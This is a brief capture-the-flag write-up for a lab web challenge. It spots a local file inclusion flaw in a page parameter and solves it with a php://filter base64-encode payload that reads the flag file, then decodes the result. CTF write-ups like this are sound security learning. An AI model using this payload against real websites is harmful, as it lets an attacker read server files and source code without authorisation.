Challenge Description:
<br>In the hidden village of Kagegakure, the Shadow Clan guards ancient secrets. Amidst rumors of betrayal, your mission is to infiltrate their secure server and uncover the truth. Prove your hacking skills and reveal the hidden secrets of the Shadow Clan.

## Exploration
```http://192.168.59.128/?page=home```
<br>this way of handling webpages can lead to local file inclusion vulnerability.

## Solution
Insert the payload below
<br>```php://filter/convert.base64-encode/resource=flag```

![image](https://github.com/user-attachments/assets/adb87647-5ccc-4950-8e63-080eb9a82bc8)

Decode the base64

![image](https://github.com/user-attachments/assets/eba2e1b1-e26a-48c8-8953-af120e860dac)
